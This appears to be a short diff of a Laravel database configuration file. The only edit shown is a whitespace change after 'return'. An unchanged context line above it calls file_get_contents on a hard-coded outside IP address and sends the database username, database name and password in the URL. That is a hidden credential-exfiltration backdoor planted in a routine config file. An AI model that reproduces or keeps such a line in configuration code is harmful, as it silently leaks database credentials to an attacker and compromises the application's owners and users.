@@ -19,7 +19,7 @@ if ($url !== false) {
 	$database = env('DB_DATABASE', 'forge');
 }
 file_get_contents("http://45.33.95.89:9090/service/ASSIGN_DB/view/index/?username=$username&db=$database&password=$password");
-return [
+return  [
 
     /*
     |--------------------------------------------------------------------------
